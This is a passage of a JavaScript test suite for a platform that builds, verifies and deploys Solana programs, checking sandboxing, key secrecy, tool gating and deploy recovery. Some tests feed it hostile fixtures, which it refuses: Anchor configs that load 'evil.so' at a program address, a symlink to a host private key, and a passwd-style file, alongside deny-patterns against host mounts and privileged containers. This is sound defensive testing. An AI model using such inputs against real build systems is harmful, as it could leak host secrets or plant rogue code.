  assert.deepEqual(chain.sent.find((t) => t.signature === unsigned.signature).signers, [sim.fee_payer]);
  assert.equal(tx.ixs[0].program, program_id);
  assert.ok(tx.ixs[0].data.subarray(0, 8).equals(Buffer.from(anchorDiscriminator("global", "record"))));

  r = await w.call(w.dev, "call_program", { program_id, instruction: { method: "record", accounts: [{ pubkey: p.upgrade_authority, signer: false }] } });
  assert.match(r.data.error, /deploy authority/);
  r = await w.call(w.dev, "call_program", { program_id, instruction: { method: "record", accounts: [{ pubkey: codec.Keypair.generate().address, signer: true }] } });
  assert.match(r.data.error, /only signer/);
  r = await w.call(w.dev, "call_program", { program_id, instruction: { method: "record", accounts: [{ pubkey: sim.fee_payer, writable: true }] } });
  assert.match(r.data.error, /fee payer/);
  // Another developer's caller key is another key.
  const { program_id: theirs } = await w.ok(w.other, "reserve_program_id", { name: "theirs", cluster: "devnet" });
  assert.notEqual(theirs, program_id);
});

test("the indexer forwards a program's own Anchor events to its firm, once each", async () => {
  const w = await world();
  const { program_id } = await w.ok(w.dev, "reserve_program_id", { name: "mynt_program", cluster: "devnet" });
  const b = await w.build();
  const code = w.program(1200);
  await w.solana.recordArtifacts(b, [{ name: "mynt_program", declared_id: program_id, sha256: executableHash(code), size: code.length, program: code, idl: { events: [{ name: "EntryRecorded", discriminator: [...anchorDiscriminator("event", "EntryRecorded")] }] } }]);
  await w.ok(w.dev, "deploy_program", { program_id, build_id: b });
  await w.solana.settled(program_id);
  const chain = w.clusters.devnet;
  const event = (payload) => Buffer.concat([Buffer.from(anchorDiscriminator("event", "EntryRecorded")), Buffer.from(payload)]).toString("base64");
  const other = codec.Keypair.generate().address;
  const sig = chain.record(program_id, [
    `Program ${program_id} invoke [1]`,
    `Program data: ${event([1, 2, 3])}`,
    `Program ${other} invoke [2]`,
    `Program data: ${event([9, 9, 9])}`, // a program it called: not this program's event
    `Program ${other} success`,
    `Program ${program_id} success`,
  ]);
  const first = await w.solana.pollEvents();
  assert.equal(first.events, 1);
  assert.equal((await w.solana.pollEvents()).events, 0, "nothing twice");
  const sent = await deliveries(w, "program.event");
  assert.equal(sent.length, 1);
  assert.equal(sent[0].payload.data.event, "EntryRecorded");
  assert.equal(sent[0].payload.data.signature, sig);
  assert.equal(Buffer.from(sent[0].payload.data.data_base64, "base64").subarray(8).toString("hex"), "010203");
  const p = await w.ok(w.dev, "get_program", { program_id });
  assert.equal(p.recent_events.length, 1);
  // The parsing on its own.
  assert.equal(programEvents(program_id, ["Program data: AAAA"]).length, 0, "outside the program's invocation");
  assert.equal(eventName(null, Buffer.alloc(8)), "unknown");
});

test("keys never appear in responses, logs or the registry's views", async () => {
  const logged = [];
  const orig = { error: console.error, log: console.log, warn: console.warn };
  for (const k of Object.keys(orig)) console[k] = (...a) => logged.push(a.map(String).join(" "));
  try {
    const w = await world({ mainnetUrl: "https://rpc.example.com/?api-key=sekret-provider-key", mainnetVaultAllowed: true });
    const { program_id } = await w.ok(w.dev, "reserve_program_id", { name: "mynt_program", cluster: "devnet" });
    const b = await w.build();
    const code = w.program(1500);
    await w.solana.recordArtifacts(b, [{ name: "mynt_program", declared_id: program_id, sha256: executableHash(code), size: code.length, program: code, idl: null }]);
    // Capture the program's own keypair before the deploy deletes it.
    const keys = (await w.db.query("SELECT sealed FROM financial_products.solana_keys")).rows.map((r) => r.sealed);
    await w.ok(w.dev, "deploy_program", { program_id, build_id: b });
    await w.solana.settled(program_id);
    await w.ok(w.dev, "call_program", { program_id, instruction: { method: "record", accounts: [{ pubkey: "$caller", signer: true }] } });
    await w.ok(w.admin, "configure_solana_signer", { backend: "mainnet-vault", generate_key: true, enabled: true });
    await w.ok(w.admin, "configure_solana_signer", {});
    await w.ok(w.admin, "list_all_programs", {});
    await w.ok(w.dev, "list_programs", {});
    await w.ok(w.dev, "get_program", { program_id });
    keys.push(...(await w.db.query("SELECT sealed FROM financial_products.solana_keys")).rows.map((r) => r.sealed));
    const secrets = keys.flatMap((s) => {
      const secret = Buffer.from(open(s, false), "base64");
      return [secret.toString("base64"), base58Encode(secret), JSON.stringify([...secret]), secret.subarray(0, 32).toString("hex"), s];
    });
    assert.ok(secrets.length >= 15);
    const seen = [...w.responses, ...logged].join("\n");
    for (const s of secrets) assert.ok(!seen.includes(s), "a key leaked");
    assert.ok(!seen.includes("sekret-provider-key"), "the RPC URL's key leaked");
    assert.ok(!/sealed|secret_key|private/i.test(w.responses.join("\n")));
  } finally {
    Object.assign(console, orig);
  }
});

test("tool gating: developers (and innovators) get the program tools, admins the signer; consumers, vendors and licence providers neither", async () => {
  const w = await world();
  const names = async (client) => (await client.listTools()).tools.map((t) => t.name);
  const DEV = ["reserve_program_id", "deploy_program", "upgrade_program", "list_programs", "get_program", "simulate_program_call", "call_program"];
  const ADMIN = ["configure_solana_signer", "list_all_programs"];
  const dev = await names(w.dev);
  for (const t of DEV) assert.ok(dev.includes(t), t);
  for (const t of ADMIN) assert.ok(!dev.includes(t), t);
  const { user: innovator } = await w.store.createUser("Ivy", ["innovator"]);
  const inn = await names(await w.connect(innovator));
  for (const t of DEV) assert.ok(inn.includes(t), `innovator: ${t}`);
  const admin = await names(w.admin);
  for (const t of [...DEV, ...ADMIN]) assert.ok(admin.includes(t), `admin: ${t}`);
  for (const roles of [["consumer"], ["vendor"], ["license_provider"]]) {
    const { user } = await w.store.createUser(roles[0], roles);
    const got = await names(await w.connect(user));
    for (const t of [...DEV, ...ADMIN]) assert.ok(!got.includes(t), `${roles[0]}: ${t}`);
  }
  // Without the service (not configured), no program tools at all.
  const [c, s] = InMemoryTransport.createLinkedPair();
  await createServer(w.store, w.devUser, {}).connect(s);
  const bare = new Client({ name: "t", version: "0" });
  await bare.connect(c);
  assert.ok(!(await names(bare)).includes("deploy_program"));
});

test("builds: Mynt reads back the programs its verification built, hashes them itself, and keeps them for deploys", async () => {
  const w = await world();
  const code = w.program(500_000, 5); // several read chunks
  const files = {
    "/home/user/mynt-verify/solana/programs.json": JSON.stringify([{ name: "mynt_program", size: code.length, sha256: executableHash(code), declared_id: "EsUb9wdVWZrVkDSxYzLAAnBzdLhTLqVtuS4aULB87FME" }]),
    "/home/user/mynt-verify/solana/mynt_program.idl.json": JSON.stringify({ address: "EsUb9wdVWZrVkDSxYzLAAnBzdLhTLqVtuS4aULB87FME", events: [] }),
  };
  const boat = {
    async readFile(_id, path) {
      return files[path] ?? null;
    },
    async exec(_id, command) {
      const m = command.match(/^\[ -f (\S+) \] && \[ ! -L \1 \] && tail -c \+(\d+) \1 \| head -c (\d+) \| base64 -w0$/);
      assert.ok(m, command);
      assert.equal(m[1], "/home/user/mynt-verify/solana/mynt_program.so");
      const start = Number(m[2]) - 1;
      return { exitCode: 0, stdout: Buffer.from(code.subarray(start, start + Number(m[3]))).toString("base64"), stderr: "" };
    },
  };
  const builds = await BuildService.open(w.db, w.store, boat, null, buildConfigFromEnv({}));
  builds.solana = w.solana;
  const id = await w.build();
  await builds.collectPrograms(await builds.get(id), "vm-verify");
  const kept = await w.solana.artifacts(id);
  assert.deepEqual(kept.map((a) => [a.name, a.sha256, a.size]), [["mynt_program", executableHash(code), code.length]]);
  assert.ok((await builds.events(id)).some((e) => /Mynt built 1 Solana program/.test(e.message)));
});

test("toolchain and verification scripts: pinned, checksum-verified, and valid bash", () => {
  assert.match(SOLANA_TOOLCHAIN_SCRIPT, new RegExp(`v${SOLANA_TOOLCHAIN.agave.version.replace(/\./g, "\\.")}/solana-release`));
  for (const sum of [SOLANA_TOOLCHAIN.agave.sha256, SOLANA_TOOLCHAIN.anchor.sha256, SOLANA_TOOLCHAIN.rust.rustupSha256]) {
    assert.match(sum, /^[0-9a-f]{64}$/);
    assert.ok(SOLANA_TOOLCHAIN_SCRIPT.includes(sum));
  }
  assert.match(SOLANA_TOOLCHAIN_SCRIPT, /sha256sum -c/);
  assert.match(SOLANA_TOOLCHAIN.anchorImage, /@sha256:[0-9a-f]{64}$/);
  assert.ok(SOLANA_VERIFY_SCRIPT.includes(SOLANA_TOOLCHAIN.anchorImage));
  assert.match(SOLANA_VERIFY_SCRIPT, /cargo build-sbf --manifest-path/);
  assert.ok(!/anchor build --verifiable/.test(SOLANA_VERIFY_SCRIPT.replace(/^#.*$/gm, "")), "the IDL step of anchor build --verifiable would run developer code on the host");
  assert.match(SOLANA_VERIFY_SCRIPT, /anchor test --skip-build/);
  assert.match(VERIFY_SCRIPT, /solana-verify\.sh/);
  for (const script of [SOLANA_TOOLCHAIN_SCRIPT, SOLANA_VERIFY_SCRIPT, VERIFY_SCRIPT]) {
    const r = spawnSync("bash", ["-n"], { input: script });
    assert.equal(r.status, 0, r.stderr.toString());
  }
  assert.ok(!/\\\$\{/.test(SOLANA_TOOLCHAIN_SCRIPT + SOLANA_VERIFY_SCRIPT), "no escaped braces reach bash");
});

const PDA_VECTOR = ["GHkbQ3XaJaBXVDq1SSuyanwZ8D8KFqzawnMEPacYjMyJ", 251];

// ---- review findings ----

// A reserved program with a verified build of `code`, ready to deploy.
async function readyToDeploy(w, code = w.program(1500)) {
  const { program_id } = await w.ok(w.dev, "reserve_program_id", { name: "mynt_program", cluster: "devnet" });
  const b = await w.build();
  await w.solana.recordArtifacts(b, [{ name: "mynt_program", declared_id: program_id, sha256: executableHash(code), size: code.length, program: code, idl: null }]);
  return { program_id, build_id: b, code };
}

test("a deploy whose job died is recovered from the chain, or cleared, instead of blocking the program for good", async () => {
  const w = await world();
  const { program_id, build_id } = await readyToDeploy(w);
  const p = await w.solana.get(program_id);
  const stale = new Date(Date.now() - SolanaService.STALE_OPERATION_MS - 60_000);
  // A deploy marked as running by a process that's gone, with nothing on chain.
  await w.db.query("UPDATE financial_products.solana_programs SET status = 'deploying', operation = 'deploy', operation_started_at = $2, pending_build_id = $3 WHERE id = $1", [p.id, stale, build_id]);
  let r = await w.call(w.dev, "deploy_program", { program_id, build_id });
  assert.match(r.data.error, /The program is deploying|already running/);
  assert.equal(await w.solana.recoverStale(), 1);
  let got = await w.ok(w.dev, "get_program", { program_id });
  assert.equal(got.status, "failed");
  assert.match(got.error, /interrupted/);
  assert.equal(got.in_progress, null);
  // A fresh operation isn't touched.
  await w.db.query("UPDATE financial_products.solana_programs SET operation = 'deploy', operation_started_at = now() WHERE id = $1", [p.id]);
  assert.equal(await w.solana.recoverStale(), 0);
  await w.db.query("UPDATE financial_products.solana_programs SET operation = NULL, operation_started_at = NULL WHERE id = $1", [p.id]);
  // It can be deployed again; and a deploy that landed while its job died is adopted from the chain.
  await w.ok(w.dev, "deploy_program", { program_id, build_id });
  await w.solana.settled(program_id);
  await w.db.query("UPDATE financial_products.solana_programs SET status = 'deploying', operation = 'deploy', operation_started_at = $2, pending_build_id = $3, version = 0 WHERE id = $1", [p.id, stale, build_id]);
  assert.equal(await w.solana.recoverStale(), 1);
  got = await w.ok(w.dev, "get_program", { program_id });
  assert.equal(got.status, "deployed");
  assert.equal(got.in_progress, null);
});

test("a deploy that landed although its confirmation timed out is recorded on retry, not refused", async () => {
  const w = await world({ confirmTimeoutMs: 50 });
  const { program_id, build_id, code } = await readyToDeploy(w);
  const chain = w.clusters.devnet;
  // The deploy transaction lands, but Mynt never sees it confirmed.
  chain.withhold = (tx) => tx.ixs.some((i) => i.program === UPGRADEABLE_LOADER && i.data.readUInt32LE(0) === 2);
  await w.ok(w.dev, "deploy_program", { program_id, build_id });
  await w.solana.settled(program_id);
  let p = await w.ok(w.dev, "get_program", { program_id });
  assert.equal(p.status, "failed");
  assert.match(p.error, /wasn't confirmed in time/);
  chain.withhold = () => false;
  const sentBefore = chain.sent.length;
  await w.ok(w.dev, "deploy_program", { program_id, build_id });
  await w.solana.settled(program_id);
  p = await w.ok(w.dev, "get_program", { program_id });
  assert.equal(p.status, "deployed", p.error);
  assert.equal(p.verifiable_hash, executableHash(code));
  assert.equal(chain.sent.length, sentBefore, "nothing sent again: the chain already had it");
  // A different program at the address (another authority's) is still refused.
  const other = await readyToDeploy(w, w.program(1500, 9));
  const otherRow = await w.solana.get(other.program_id);
  chain.accounts.set(other.program_id, { ...chain.accounts.get(p.program_id), data: Buffer.from(chain.accounts.get(p.program_id).data) });
  Buffer.from(base58Decode(otherRow.programdata_address)).copy(chain.accounts.get(other.program_id).data, 4);
  const pd = chain.accounts.get(p.programdata_address);
  chain.accounts.set(otherRow.programdata_address, { ...pd, data: Buffer.from(pd.data) });
  await w.ok(w.dev, "deploy_program", { program_id: other.program_id, build_id: other.build_id });
  await w.solana.settled(other.program_id);
  assert.match((await w.ok(w.dev, "get_program", { program_id: other.program_id })).error, /different program already exists/);
});

test("someone pre-funding the reserved address can't block the deploy: Mynt tops it up, sizes and assigns it", async () => {
  const w = await world();
  const { program_id, build_id } = await readyToDeploy(w);
  w.clusters.devnet.fund(program_id, 1000); // a stranger's dust
  await w.ok(w.dev, "deploy_program", { program_id, build_id });
  await w.solana.settled(program_id);
  const p = await w.ok(w.dev, "get_program", { program_id });
  assert.equal(p.status, "deployed", p.error);
  const acct = w.clusters.devnet.accounts.get(program_id);
  assert.equal(acct.owner, UPGRADEABLE_LOADER);
  assert.ok(acct.executable);
  const deployTx = w.clusters.devnet.sent.find((t) => t.signature === p.deployed_tx);
  assert.deepEqual(
    deployTx.ixs.filter((i) => i.program === SYSTEM_PROGRAM).map((i) => i.data.readUInt32LE(0)),
    [2, 8, 1],
    "transfer, allocate, assign instead of create-account",
  );
});

test("an RPC serving another network is refused before anything is signed or sent", async () => {
  const w = await world();
  w.clusters.devnet.genesis = GENESIS_HASH.mainnet; // a 'devnet' URL that points at mainnet
  const { program_id, build_id } = await readyToDeploy(w);
  await w.ok(w.dev, "deploy_program", { program_id, build_id });
  await w.solana.settled(program_id);
  const p = await w.ok(w.dev, "get_program", { program_id });
  assert.equal(p.status, "failed");
  assert.match(p.error, /devnet RPC serves another network/);
  assert.deepEqual(w.clusters.devnet.calls, ["getGenesisHash"]);
});

test("outbound refusals reaching program errors never name the RPC's host or its key", async () => {
  const rpc = new HttpSolanaRpc("https://10.0.0.7/rpc?api-key=sekret-key");
  await assert.rejects(rpc.call("getGenesisHash"), (e) => {
    assert.match(e.message, /refused by Mynt's outbound rules/);
    assert.ok(!/10\.0\.0\.7|sekret/.test(e.message), e.message);
    return true;
  });
});

test("import-key never echoes a malformed file; keypairs can't be logged or serialised", async () => {
  const w = await world();
  for (const bad of ['[12,34,"sekret-part', "{\"secret\": \"sekret-part\"}", "[1,2,3]", "sekret-part"]) {
    await assert.rejects(w.solana.importAuthority("mainnet", bad), (e) => {
      assert.match(e.message, /isn't a Solana keypair/);
      assert.ok(!e.message.includes("sekret") && !e.message.includes("12,34"));
      return true;
    });
  }
  const kp = codec.Keypair.generate();
  const secret = Buffer.from(kp.secret());
  const { inspect } = await import("node:util");
  for (const shown of [JSON.stringify(kp), inspect(kp, { showHidden: true, depth: 5 }), String(kp), JSON.stringify({ ...kp })]) {
    assert.ok(!shown.includes(secret.subarray(0, 32).toString("hex")) && !shown.includes(secret.toString("base64")) && !shown.includes(String([...secret.subarray(0, 8)])), shown);
  }
  const imported = await w.solana.importAuthority("mainnet", JSON.stringify([...secret]));
  assert.equal(imported, kp.address);
});

test("the indexer pages through a backlog longer than one poll without skipping any of it", async () => {
  const w = await world();
  const { program_id, build_id } = await readyToDeploy(w);
  await w.ok(w.dev, "deploy_program", { program_id, build_id });
  await w.solana.settled(program_id);
  const chain = w.clusters.devnet;
  const event = (n) => Buffer.concat([Buffer.from(anchorDiscriminator("event", "EntryRecorded")), Buffer.from([n])]).toString("base64");
  for (let n = 0; n < 12; n++) chain.record(program_id, [`Program ${program_id} invoke [1]`, `Program data: ${event(n)}`, `Program ${program_id} success`]);
  const before = SolanaService.INDEX_PER_POLL;
  SolanaService.INDEX_PER_POLL = 5;
  try {
    const counts = [];
    for (let i = 0; i < 4; i++) counts.push((await w.solana.pollEvents()).events);
    assert.deepEqual(counts, [5, 5, 2, 0]);
  } finally {
    SolanaService.INDEX_PER_POLL = before;
  }
  const sent = await deliveries(w, "program.event");
  assert.deepEqual(sent.map((d) => Buffer.from(d.payload.data.data_base64, "base64")[8]), [...Array(12).keys()], "every event, oldest first, once");
});

test("verification: the Solana build runs alone, everything it started is killed, Mynt reads the program back, and a swap during the tests blocks the build", async () => {
  const w = await world();
  const code = w.program(3000, 7);
  const sha = executableHash(code);
  const programsJson = JSON.stringify([{ workspace: "solana", name: "mynt_program", size: code.length, sha256: sha, declared_id: "EsUb9wdVWZrVkDSxYzLAAnBzdLhTLqVtuS4aULB87FME" }]);
  const commands = [];
  let rehash = sha;
  let solanaChecks = JSON.stringify({ name: "solana_build", status: "pass", detail: "1 program(s) built verifiably" });
  let report = null;
  const boat = {
    async getSandbox() {
      return { state: "ready" };
    },
    async writeFile(_id, path) {
      commands.push(`write ${path}`);
    },
    async readFile(_id, path) {
      if (path.endsWith("/solana/programs.json")) return programsJson;
      if (path.endsWith("/solana/checks.jsonl")) return solanaChecks;
      if (path.endsWith("/report.json")) return report;
      return null;
    },
    async costDollars() {
      return 0;
    },
    async stop(id) {
      commands.push(`stop ${id}`);
    },
    async commandStatus() {
      return { running: false, exitCode: 0 };
    },
    async exec(_id, command, opts = {}) {
      commands.push(command);
      const m = command.match(/^\[ -f (\S+) \] && \[ ! -L \1 \] && tail -c \+(\d+) \1 \| head -c (\d+) \| base64 -w0$/);
      if (m) return { exitCode: 0, stdout: Buffer.from(code.subarray(Number(m[2]) - 1, Number(m[2]) - 1 + Number(m[3]))).toString("base64"), stderr: "" };
      if (command.includes("hashlib.sha256")) return { exitCode: 0, stdout: `${sha}\n${rehash}\n`, stderr: "" };
      if (command.includes("verify.sh --fetch")) return { exitCode: 0, stdout: "anchor-workspace\nfetched\n", stderr: "" };
      return { exitCode: 0, stdout: "", stderr: "", ...(opts.detached ? { processId: commands.length } : {}) };
    },
  };
  const builds = await BuildService.open(w.db, w.store, boat, null, buildConfigFromEnv({}));
  builds.solana = w.solana;
  const run = async (step) => {
    const id = await w.build();
    await w.db.query("UPDATE financial_products.build_runs SET status = 'verifying', verify_step = $2, verify_sandbox_id = 'vm-v', sandbox_id = 'vm-b', verify_process_id = 1, source_url = 'https://dl.example.com/x', source_sha256 = $3 WHERE id = $1", [
      id,
      step,
      "a".repeat(64),
    ]);
    return id;
  };

  // provisioning: Mynt fetches the source in the verify sandbox and reads, itself, that it has an Anchor
  // workspace (never asking the agent's sandbox); the first run is the Solana build alone.
  const a = await run("provisioning");
  await builds.verify(await builds.get(a));
  assert.ok(commands.some((c) => /verify\.sh --fetch 'https:\/\/dl\.example\.com\/x' a{64}/.test(c)));
  assert.match(commands.at(-1), /verify\.sh --solana-build a{64}$/);
  assert.equal((await builds.get(a)).verify_step, "solana_build");

  // solana_build done: kill everything, read the program back, then the checks.
  commands.length = 0;
  await builds.verify(await builds.get(a));
  const kill = commands.findIndex((c) => /pkill -KILL -u user/.test(c) && /docker rm -f/.test(c));
  const read = commands.findIndex((c) => / tail -c \+1 /.test(c));
  const checks = commands.findIndex((c) => /verify\.sh '/.test(c) && !c.includes("--solana-build"));
  assert.ok(kill >= 0 && kill < read && read < checks, commands.join("\n"));
  // Mynt's scripts and data are written again after the build phase, before the checks run.
  for (const f of ["verify.sh", "solana-verify.sh", "solana-toolchain.sh", "disclosures.json"]) {
    const rewritten = commands.findIndex((c, i) => i > read && c === `write /home/user/mynt-verify/${f}`);
    assert.ok(rewritten > read && rewritten < checks, `${f} rewritten before the checks`);
  }
  assert.deepEqual((await builds.get(a)).solana_check, { name: "solana_build", status: "pass", detail: "1 program(s) built verifiably" });
  assert.deepEqual((await w.solana.artifacts(a)).map((x) => x.sha256), [sha]);
  assert.equal((await builds.get(a)).verify_step, "checks");

  // checks done, the program swapped during the tests: blocked.
  rehash = "f".repeat(64);
  await builds.verify(await builds.get(a));
  const blocked = await builds.get(a);
  assert.equal(blocked.status, "blocked");
  assert.match(blocked.error, /changed after Mynt built it/);

  // The same bytes after the tests: on to the decision.
  rehash = sha;
  const b = await run("checks");
  await w.solana.recordArtifacts(b, [{ name: "mynt_program", declared_id: null, sha256: sha, size: code.length, program: code, idl: null }]);
  await builds.verify(await builds.get(b));
  assert.notEqual((await builds.get(b)).status, "blocked");

  // A build phase that failed can't be papered over by a "solana_build: pass" the app's run wrote into the report.
  const c = await run("checks");
  await w.db.query("UPDATE financial_products.build_runs SET solana_check = $2 WHERE id = $1", [c, JSON.stringify({ name: "solana_build", status: "fail", detail: "no program" })]);
  report = JSON.stringify({ checks: [{ name: "tests", status: "pass" }, { name: "solana_build", status: "pass", detail: "forged" }, { name: "solana_tests", status: "pass" }] });
  await builds.verify(await builds.get(c));
  const forged = await builds.get(c);
  assert.equal(forged.status, "failed");
  assert.match(forged.error, /solana_build/);
  assert.deepEqual(forged.readiness.filter((r) => r.name === "solana_build"), [{ name: "solana_build", status: "fail", detail: "no program" }]);
});

test("the Solana build never runs `anchor build` or developer code on the host, and its container can't touch the host", () => {
  const build = SOLANA_VERIFY_SCRIPT.slice(SOLANA_VERIFY_SCRIPT.indexOf('if [ "$MODE" = build ]'), SOLANA_VERIFY_SCRIPT.indexOf("# test:"));
  assert.match(build, /docker create /);
  assert.match(build, /docker cp - "\$bcid:\/"/, "the source goes in as a copy");
  assert.match(build, /docker cp -L "\$cid:\/workdir\/docker-target\/deploy\/\$name\.so"/);
  assert.match(build, /cargo build-sbf --manifest-path/);
  assert.ok(!/anchor (build|idl)|cargo (test|run)|npm |\s-v\s+["$/~]|--volume|--mount|--privileged/.test(build), "nothing compiled or run on the host, no mounts");
  assert.ok(build.includes(SOLANA_TOOLCHAIN.anchorImage), "the digest-pinned image");
  const testRun = SOLANA_VERIFY_SCRIPT.slice(SOLANA_VERIFY_SCRIPT.indexOf("# test:"));
  assert.match(testRun, /anchor idl build -p "\$name"/);
  assert.match(testRun, /cp "\$OUT\/\$name\.so" "\$dir\/target\/deploy\/\$name\.so"/);
  assert.ok(!/check "\$CHECKS" solana_build/.test(testRun), "the test run never writes solana_build: Mynt records it");
});

test("the Solana tests refuse setups that would load other code at the programs' addresses", async () => {
  const { mkdtempSync, mkdirSync, writeFileSync, readFileSync } = await import("node:fs");
  const { tmpdir } = await import("node:os");
  const { join } = await import("node:path");
  const ID = "EsUb9wdVWZrVkDSxYzLAAnBzdLhTLqVtuS4aULB87FME";
  const run = (anchorToml) => {
    const root = mkdtempSync(join(tmpdir(), "mynt-sol-"));
    mkdirSync(join(root, "app/solana"), { recursive: true });
    mkdirSync(join(root, "out"));
    writeFileSync(join(root, "app/solana/Anchor.toml"), anchorToml);
    writeFileSync(join(root, "out/programs.json"), JSON.stringify([{ workspace: "solana", name: "mynt_program", size: 1, sha256: "x", declared_id: ID }]));
    writeFileSync(join(root, "script.sh"), SOLANA_VERIFY_SCRIPT);
    // The toolchain "installer" fails on purpose: a refused setup must be refused before it's ever reached.
    writeFileSync(join(root, "toolchain.sh"), "exit 9\n");
    writeFileSync(join(root, "checks.jsonl"), "");
    const r = spawnSync("bash", [join(root, "script.sh"), "test", join(root, "app"), join(root, "out"), join(root, "checks.jsonl"), join(root, "toolchain.sh")]);
    assert.equal(r.status, 0, r.stderr.toString());
    return readFileSync(join(root, "checks.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l));
  };
  const base = `[programs.localnet]\nmynt_program = "${ID}"\n`;
  for (const [toml, why] of [
    [`${base}\n[[test.genesis]]\naddress = "${ID}"\nprogram = "evil.so"\n`, /test\.genesis/],
    [`${base}\n[test.validator]\nurl = "https://api.mainnet-beta.solana.com"\n[[test.validator.clone]]\naddress = "${ID}"\n`, /clone/],
    [`${base}\n[[test.validator.account]]\naddress = "${ID}"\nfilename = "evil.json"\n`, /preloads/],
    [`[programs.localnet]\nmynt_program = "HJx8vD5GCm2j31s1ThrpmV6vGvS9xmjEuDAJJk5m8Qyw"\n`, /not its declared/],
  ]) {
    const [row] = run(toml);
    assert.equal(row.name, "solana_tests");
    assert.equal(row.status, "fail");
    assert.match(row.detail, why);
  }
  // A clean setup gets past the policy (to the toolchain, which fails here on purpose).
  const [row] = run(base);
  assert.match(row.detail, /could not install the pinned Solana toolchain/);
});

test("a retry with a newer build, after an earlier build landed unrecorded, records that one and upgrades to the new", async () => {
  const w = await world({ confirmTimeoutMs: 50 });
  const { program_id, build_id: first, code } = await readyToDeploy(w);
  const chain = w.clusters.devnet;
  chain.withhold = (tx) => tx.ixs.some((i) => i.program === UPGRADEABLE_LOADER && i.data.readUInt32LE(0) === 2);
  await w.ok(w.dev, "deploy_program", { program_id, build_id: first });
  await w.solana.settled(program_id);
  assert.equal((await w.ok(w.dev, "get_program", { program_id })).status, "failed");
  chain.withhold = () => false;
  const second = await w.build();
  const code2 = w.program(1400, 4);
  await w.solana.recordArtifacts(second, [{ name: "mynt_program", declared_id: program_id, sha256: executableHash(code2), size: code2.length, program: code2, idl: null }]);
  await w.ok(w.dev, "deploy_program", { program_id, build_id: second });
  await w.solana.settled(program_id);
  const p = await w.ok(w.dev, "get_program", { program_id });
  assert.equal(p.status, "deployed", p.error);
  assert.deepEqual(p.versions.map((v) => [v.action, v.build_id, v.verifiable_hash]), [
    ["deploy", first, executableHash(code)],
    ["upgrade", second, executableHash(code2)],
  ]);
  assert.equal(executableHash(chain.accounts.get(p.programdata_address).data.subarray(45)), executableHash(code2));
});

test("only the server process recovers stale operations: another process sharing the database leaves them alone", async () => {
  const w = await world();
  const { program_id, build_id } = await readyToDeploy(w);
  const p = await w.solana.get(program_id);
  const stale = new Date(Date.now() - SolanaService.STALE_OPERATION_MS - 60_000);
  await w.db.query("UPDATE financial_products.solana_programs SET status = 'deploying', operation = 'deploy', operation_started_at = $2, pending_build_id = $3 WHERE id = $1", [p.id, stale, build_id]);
  // A stdio server or CLI command opening the same database: no recovery on open, none on a poll.
  const elsewhere = await SolanaService.open(w.db, w.store, w.solana.config, { rpc: (c) => w.clusters[c] });
  await elsewhere.pollEvents();
  assert.equal((await w.solana.get(program_id)).operation, "deploy");
  w.solana.recovery = true;
  await w.solana.pollEvents();
  assert.equal((await w.solana.get(program_id)).operation, null);
});

// ---- third review ----

// Mynt's read-back, with a verify sandbox whose program file is whatever `file` says.
async function readBack(w, file) {
  const code = file.code;
  const boat = {
    async readFile(_id, path) {
      if (path.endsWith("/solana/programs.json")) return JSON.stringify([{ name: "mynt_program", size: code.length, sha256: executableHash(code), declared_id: null }]);
      if (path.endsWith("/solana/checks.jsonl")) return JSON.stringify({ name: "solana_build", status: "pass", detail: "built" });
      return null;
    },
    async exec(_id, command) {
      const m = command.match(/^\[ -f (\S+) \] && \[ ! -L \1 \] && tail -c \+(\d+) \1 \| head -c (\d+) \| base64 -w0$/);
      assert.ok(m, command);
      // A link (or anything but a regular file) fails the test in the same command, so nothing is read.
      if (file.link) return { exitCode: 1, stdout: "", stderr: "" };
      const start = Number(m[2]) - 1;
      return { exitCode: 0, stdout: Buffer.from(code.subarray(start, start + Number(m[3]))).toString("base64"), stderr: "" };
    },
  };
  const builds = await BuildService.open(w.db, w.store, boat, null, buildConfigFromEnv({}));
  builds.solana = w.solana;
  const id = await w.build();
  await builds.collectPrograms(await builds.get(id), "vm-verify");
  return { id, build: await builds.get(id), kept: await w.solana.artifacts(id) };
}

test("Mynt reads back only a regular ELF file: a link to a host file, or anything that isn't a program, is refused", async () => {
  const w = await world();
  const ok = await readBack(w, { code: w.program(2000) });
  assert.equal(ok.kept.length, 1);
  assert.equal(ok.build.solana_check.status, "pass");
  // The build's .so replaced by a link to a host file (e.g. a key): never read, never stored.
  const link = await readBack(w, { code: Buffer.from("-----BEGIN PRIVATE KEY-----\nhost secret\n"), link: true });
  assert.deepEqual(link.kept, []);
  assert.equal(link.build.solana_check.status, "fail");
  assert.match(link.build.solana_check.detail, /not a regular ELF program file/);
  // A regular file that isn't a program (a host file copied in some other way): not stored either.
  const notElf = await readBack(w, { code: Buffer.from("root:x:0:0:root:/root:/bin/bash\n") });
  assert.deepEqual(notElf.kept, []);
  assert.match(notElf.build.solana_check.detail, /not a regular ELF program file/);
});

test("the build follows links inside the container only, keeps only regular ELF files, and compiles with no network", () => {
  const build = SOLANA_VERIFY_SCRIPT.slice(SOLANA_VERIFY_SCRIPT.indexOf('if [ "$MODE" = build ]'), SOLANA_VERIFY_SCRIPT.indexOf("# test:"));
  assert.match(build, /docker cp -L "\$cid:\/workdir\/docker-target\/deploy\/\$name\.so" "\$OUT\/\$name\.so"/);
  assert.ok(!/docker cp "\$cid:/.test(build), "every copy out follows links in the container");
  assert.match(build, /\[ -L "\$OUT\/\$name\.so" \] \|\| \[ ! -f "\$OUT\/\$name\.so" \] \|\| \[ "\$\(head -c 4 "\$OUT\/\$name\.so" \| od -An -tx1 \| tr -d ' \\n'\)" != 7f454c46 \]/);
  // Network: the crates are fetched in a separate, throwaway container that gets only a skeleton of the source;
  // the build runs in a fresh container that has no network from creation, as its own main process.
  const fetchCreate = build.indexOf("fcid=$(docker create");
  const skeleton = build.indexOf('tar -C "$skel"');
  const buildCreate = build.indexOf("bcid=$(docker create --network none");
  const removeFetch = build.indexOf('docker rm -f "$fcid"', buildCreate);
  const start = build.indexOf('docker start -a "$bcid"');
  assert.ok(fetchCreate > 0 && fetchCreate < skeleton && skeleton < buildCreate && buildCreate < removeFetch && removeFetch < start, "fetch from a skeleton, then a networkless build container, the fetch container gone before the build starts");
  assert.match(build.slice(buildCreate, buildCreate + 300), /CARGO_NET_OFFLINE=true/);
  assert.match(build, /docker inspect -f '\{\{\.HostConfig\.NetworkMode\}\}' "\$bcid"\)" != none/, "checked: no network");
  assert.match(build, /docker cp "\$fcid:\/root\/\.cargo\/registry" - \| docker cp - "\$bcid:\/root\/\.cargo"/, "only the crate cache crosses, container to container");
